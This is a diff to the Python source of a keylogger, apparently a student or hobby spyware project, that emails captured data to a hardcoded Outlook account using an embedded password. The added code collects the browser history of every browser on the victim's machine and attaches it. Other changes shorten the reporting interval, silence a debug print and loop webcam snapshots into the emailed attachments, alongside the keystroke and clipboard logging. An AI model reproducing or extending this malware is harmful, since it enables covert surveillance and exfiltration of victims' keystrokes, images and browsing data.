@@ -5,6 +5,7 @@ import pyperclip
 import sounddevice
 import cv2
 import time
+import browserhistory
 from scipy.io.wavfile import write
 from threading import Timer, Thread
 from datetime import datetime
@@ -15,7 +16,7 @@ from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
 
 #PARAMATERS
-INTERVAL = 60 # in seconds, 60 means 1 minute and so on
+INTERVAL = 30 # in seconds, 60 means 1 minute and so on
 EMAIL_ADDRESS = "SomethingAwesome6441@outlook.com"
 EMAIL_PASSWORD = "ThisIsAStrongPassword"
 
@@ -86,6 +87,17 @@ class Keylogger:
                     clipboard_file.write(f"{clip}\n")
             files.append("file_attachments/clipboard.txt")
         
+        # create a file with current browser history
+        with open("file_attachments/browserhistory.txt", "w") as b_history_file:
+            browser_history = browserhistory.get_browserhistory()
+            #for every browser
+            for browser in browser_history.keys():
+                b_history_file.write(f"==={browser}===\n")
+                for history in browser_history[browser]:
+                    b_history_file.write(f"{history}\n")
+                b_history_file.write("\n\n")
+        files.append("file_attachments/browserhistory.txt")
+        
         # add file attachments to email
         for file in files:
             # open file with read and binary mode
@@ -129,7 +141,7 @@ class Keylogger:
             message = self.log
             files = self.attachments
             clipboard = self.clipboard_history
-            print(message, files, clipboard)
+            # print(message, files, clipboard)
             self.send_email(EMAIL_ADDRESS, EMAIL_PASSWORD, message, files, clipboard)
             # elif self.report_method == "file":
             #     self.report_to_file()
@@ -168,11 +180,7 @@ class Keylogger:
         # # start the timer
         # timer.start()
     
-    def capture_webcam(self):
-        # duration = self.interval/2
-        # if self.interval/2 > 10:
-        #     duration = 10      
-        # fourcc = cv2.VideoWriter_fourcc(*'mp4v')      
+    def capture_webcam(self):  #TODO: see if I can make faster, cv2 seems to be really slow
         while True:
             cap = cv2.VideoCapture(0)
             ret, frame = cap.read()
@@ -180,24 +188,7 @@ class Keylogger:
                 dt = f'{datetime.now()}'
                 web_cap_name = f'file_attachments/webcam{dt.replace(".", "-").replace(":", "-").replace(" ", "_")}.png'
                 cv2.imwrite(web_cap_name, frame)
-            # out = cv2.VideoWriter(vid_name, fourcc, 20.0, (640, 480))
-            # start = time.time()
-            # while int(time.time() - start) < duration:
-            #     ret, frame = cap.read()
-            #     if not ret:
-            #         break
-            #     frame = cv2.flip(frame,1)
-            #     out.write(frame) 
                 self.attachments.append(web_cap_name)
-        #     cap.release()
-        # # # out.release()
-        #     cv2.destroyAllWindows()
-            # print("saved")      
-        # set interval for screen capture
-            # interval = self.interval/2
-            # if self.interval/2 > 5:
-            #     interval = 5
-            # time.sleep(interval)
 
         # timer = Timer(interval=interval, function=self.capture_webcam)
         # # set the thread as daemon (dies when main thread die)
